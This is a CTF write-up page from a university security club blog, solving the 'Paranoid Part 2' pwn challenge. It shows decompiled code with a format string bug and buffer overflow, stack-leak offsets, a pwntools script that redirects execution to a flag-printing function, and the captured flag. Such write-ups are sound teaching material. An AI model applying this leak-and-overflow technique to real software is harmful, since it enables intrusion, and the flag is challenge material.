@@ -1,0 +1,91 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Paranoid Part 2</title><meta content="Paranoid Part 2" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/paranoid2/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Paranoid Part 2" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/paranoid2/ property=twitter:url><meta content="Paranoid Part 2" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/paranoid2/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>paranoid2</span></div><time datetime=2024-07-02>Published on: <span class=accent-data>2024-07-02</span></time><address rel=author>By <span class=accent-data> Abhinav I S, and exploiitm </span></address><h1>Paranoid Part 2</h1><p>first, we will run checksec on the binary<pre class=language-bash data-lang=bash style=background:#282828;color:#fdf4c1aa><code class=language-bash data-lang=bash><span style=color:#fdf4c1>checksec --file</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>challenge
+</span></code></pre><br><div class=textCenter><img alt="Alt Text" src=image1.png></div><p>Opening the binary in a decompiler (Ghidra) and looking at main function gives<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>
+</span><span style=color:#fa5c4b>void </span><span style=color:#8ec07c>main</span><span>(</span><span style=color:#fa5c4b>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  undefined local_68 [</span><span style=color:#d3869b>48</span><span>];
+</span><span>  </span><span style=color:#fa5c4b>char</span><span> local_38 [</span><span style=color:#d3869b>48</span><span>];
+</span><span>  
+</span><span>  </span><span style=color:#fdf4c1>banner()</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>      </span><span style=color:#b8bb26>"\nHey its Anonymous again...Someone leaked my temporary location to the FBI and they sent an  agent to the location I provided them"
+</span><span style=color:#fdf4c1>      )</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nIt\'s no longer safe to provide you the address of our temporary meeting point."</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nI\'m gonna have to hide and lay low for a while..."</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nTry reaching out to me after things have settled down"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nGive me a name so that I can identify you if and when you contact me: "</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>fflush</span><span style=color:#fdf4c1>(stdout)</span><span>;
+</span><span>  </span><span style=color:#fdf4c1>read(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>,local_38,</span><span style=color:#d3869b>0x23</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nAlright Mr. "</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(local_38)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"\nI\'ll look forward to doing business with you...Till then, is there anything that you would like to convey? "
+</span><span style=color:#fdf4c1>        )</span><span>;
+</span><span>  </span><span style=color:#fabd2f>fflush</span><span style=color:#fdf4c1>(stdout)</span><span>;
+</span><span>  </span><span style=color:#fdf4c1>read(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>,local_68,</span><span style=color:#d3869b>0x110</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fa5c4b>return</span><span>;
+</span><span>}
+</span></code></pre><p>Analyzing other functions, there seems to be a suspicious function safe_house<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>
+</span><span style=color:#fa5c4b>void </span><span style=color:#8ec07c>safe_house</span><span>(</span><span style=color:#fa5c4b>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#fa5c4b>char</span><span> local_98 [</span><span style=color:#d3869b>136</span><span>];
+</span><span>  FILE </span><span style=color:#fe8019>*</span><span>local_10;
+</span><span>  
+</span><span>  local_10 </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>fopen</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"flag.txt"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"r"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>(local_10 </span><span style=color:#fe8019>== </span><span>(FILE </span><span style=color:#fe8019>*</span><span>)</span><span style=color:#d3869b>0x0</span><span>) {
+</span><span>    </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"\nThere is no \'flag.txt\' present in this directory. Please create sample flag for local e xploitation."
+</span><span style=color:#fdf4c1>        )</span><span>;
+</span><span>                    </span><span style=font-style:italic;color:#928374>/* WARNING: Subroutine does not return */
+</span><span>    </span><span style=color:#fabd2f>exit</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  }
+</span><span>  </span><span style=color:#fabd2f>fgets</span><span style=color:#fdf4c1>(local_98,</span><span style=color:#d3869b>0x80</span><span style=color:#fdf4c1>,local_10)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(local_98)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>putchar</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>10</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>fflush</span><span style=color:#fdf4c1>(stdout)</span><span>;
+</span><span>                    </span><span style=font-style:italic;color:#928374>/* WARNING: Subroutine does not return */
+</span><span>  </span><span style=color:#fabd2f>exit</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>}
+</span></code></pre><p>clearly, we have to return to this function<p>there is a printf and two read function calls. We can exploit a format string vulnereability to leak addresses from the stack, and calculate address of safe_house, since PIE is enabled<p>first step is to figure out the offset for the printf format string to print out addresses in the code section<p>starting the binary in gdb, and disassembling main, we find that addresses likely in the text section start with 0x5555555</p><br><div class=textCenter><img alt="Alt Text" src=image2.png></div><p>setting a break point at the first printf, and printing the stack</p><br><div class=textCenter><img alt="Alt Text" src=image3.png></div><p>we can see that %21$lx prints out the address of main<p>Next, we need to calculate the address of safe_house from ghidra, we can see that the address of safe_house is 0x010125a, and address of main is 0x0101316<p>So, address of win is main - 188<p>We can create our solve script, overflowing the buffer, RBP, into the return address<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=font-style:italic;color:#928374>#!/usr/bin/env python3
+</span><span>
+</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span>
+</span><span>exe </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ELF(</span><span style=color:#b8bb26>"./challenge"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>context.binary </span><span style=color:#fe8019>= </span><span>exe
+</span><span style=font-style:italic;color:#928374># context.log_level = "debug"
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>conn</span><span>():
+</span><span>    </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>LOCAL</span><span>:
+</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process([exe.path])
+</span><span>        </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>DEBUG</span><span>:
+</span><span>            </span><span style=color:#fdf4c1>gdb.attach(r)
+</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
+</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"rvcechalls.xyz"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>27250</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>r
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>main</span><span>():
+</span><span>    r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>conn()
+</span><span>    </span><span style=color:#fdf4c1>r.recv()
+</span><span>    </span><span style=color:#fdf4c1>r.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"%21$lx"</span><span style=color:#fdf4c1>)
+</span><span>    data </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>r.recv()
+</span><span>    lines </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>data.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\n"</span><span style=color:#fdf4c1>)
+</span><span>    main </span><span style=color:#fe8019>= </span><span>lines[</span><span style=color:#d3869b>1</span><span>]</span><span style=color:#fdf4c1>.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"."</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>1</span><span>]</span><span style=color:#fdf4c1>.lstrip(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>" "</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(main)
+</span><span>    win </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(main,</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>- </span><span style=color:#d3869b>188
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(win))
+</span><span>    payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"A"</span><span style=color:#fe8019>*</span><span style=color:#d3869b>0x68 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(win</span><span style=color:#fe8019>+</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>r.sendline(payload)
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(r.recv())
+</span><span>    </span><span style=color:#fdf4c1>r.interactive()
+</span><span>
+</span><span>
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>if </span><span style=color:#fabd2f>__name__ </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"__main__"</span><span>:
+</span><span>    </span><span style=color:#fdf4c1>main()
+</span></code></pre><p>giving the flag<pre style=background:#282828;color:#fdf4c1aa><code><span>flag{Mr_S0-c4ll3d_4n0nym0u5_ha5_l04d5ss_0F_53cUr1Ty_155u35_1907e55351f}
+</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
